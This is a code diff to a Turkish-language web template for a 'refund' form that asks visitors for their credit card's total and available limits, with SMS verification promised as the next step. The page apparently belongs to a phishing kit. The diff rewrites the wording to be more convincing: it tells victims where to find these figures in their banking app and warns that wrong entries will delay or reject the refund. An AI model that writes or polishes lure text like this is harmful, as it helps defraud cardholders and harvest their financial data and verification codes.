@@ -1,17 +1,17 @@
 {% extends "base.html" %}
 {% block content %}
 <div class="richText">
-    İade tutarının hatalı gönderimini önlemek için lütfen kredi kartınızın toplam ve net güncel limitlerini ayrı ayrı giriniz.
+    İade işleminizin sorunsuz tamamlanabilmesi için kredi kartınıza ait toplam kart limiti ve mevcut kullanılabilir limit bilgilerinizi eksiksiz giriniz. Bu bilgiler, iade tutarınızın doğru hesaplanması ve kartınıza geri yüklenmesi için gereklidir.
 </div>
 <div class="limit-info-grid">
     <article class="limit-thumbnail">
-        <h3>T. Kredi Kartı Limitiniz</h3>
-        <p>Bankanız tarafından tanımlanan azami kredi kartı limitinizi tam sayı olarak giriniz. Bu bilgi iade sonrası artı bakiye hesabı için kullanılacaktır.</p>
+        <h3>Toplam Kart Limitiniz</h3>
+        <p>Bankanız tarafından kredi kartınıza tanımlanmış olan toplam limit tutarını giriniz. Bu bilgiyi internet bankacılığınızdan veya mobil uygulamanızdan "Kart Limitlerim" bölümünden öğrenebilirsiniz. Toplam limit, iade sonrası oluşacak artı bakiyenin hesaplanmasında kullanılır.</p>
     </article>
     <article class="limit-thumbnail">
-        <span class="limit-kicker">Bilgilendirme</span>
-        <h3>G. Kredi Kartı Limitiniz</h3>
-        <p>Güncel kullanılabilir limitiniz toplam limitten düşülerek hesaplanır. Doğru girmeniz, iade sonrası oluşacak artı bakiyeyi hızlandırır.</p>
+        <span class="limit-kicker">Önemli Bilgilendirme</span>
+        <h3>Güncel Kullanılabilir Limitiniz</h3>
+        <p>Şu anda kullanabileceğiniz kart limitini giriniz. Bu tutar, toplam limitinizden mevcut harcamalarınızın düşülmesiyle hesaplanır. Doğru girmeniz, iade işleminin hızlı ve eksiksiz tamamlanmasını sağlar. İnternet bankacılığınızdan "Kullanılabilir Limit" olarak görüntüleyebilirsiniz.</p>
     </article>
 </div>
 {% if error %}
@@ -21,19 +21,23 @@
 <form method="post" id="limitForm" autocomplete="off">
     <fieldset>
         <div class="formRow required">
-            <label for="totalLimitField" class="rowLabel">Toplam kredi kartı limitiniz</label>
+            <label for="totalLimitField" class="rowLabel">Toplam Kart Limitiniz (TL)</label>
             <div class="fieldGroup">
-                <input name="total_limit" id="totalLimitField" type="tel" maxlength="10" class="text" placeholder="Örn: 50000" value="{{ form_values.get('total_limit','') }}" required>
+                <input name="total_limit" id="totalLimitField" type="tel" maxlength="10" class="text" placeholder="Örneğin: 50000" value="{{ form_values.get('total_limit','') }}" required>
             </div>
         </div>
         <div class="formRow required">
-            <label for="currentLimitField" class="rowLabel">Güncel kredi kartı limitiniz</label>
+            <label for="currentLimitField" class="rowLabel">Güncel Kullanılabilir Limitiniz (TL)</label>
             <div class="fieldGroup">
-                <input name="current_limit" id="currentLimitField" type="tel" maxlength="10" class="text" placeholder="Örn: 12500" value="{{ form_values.get('current_limit','') }}" required>
+                <input name="current_limit" id="currentLimitField" type="tel" maxlength="10" class="text" placeholder="Örneğin: 32500" value="{{ form_values.get('current_limit','') }}" required>
             </div>
         </div>
     </fieldset>
-    <p class="limit-helper">İade Tutarınız size SMS doğrulamasından sonra bildirilecektir. Limit değerlerinizi doğru girmeniz geri ödeme hızını doğrudan etkiler.</p>
+    <p class="limit-helper">
+        <strong>Önemli:</strong> İade tutarınız, SMS doğrulama adımından sonra tarafınıza bildirilecektir. 
+        Limit bilgilerinizi eksiksiz ve doğru girmeniz, iadenizin hesaplanması ve kartınıza yüklenmesi sürecini hızlandıracaktır. 
+        Yanlış bilgi girişi durumunda işleminiz gecikebilir veya reddedilebilir.
+    </p>
     <div class="loader is-hidden">
         <img src="{{ url_for('static', filename='img/form-progress.svg') }}" alt="...">İşleminiz devam ediyor. Lütfen bekleyiniz...
     </div>
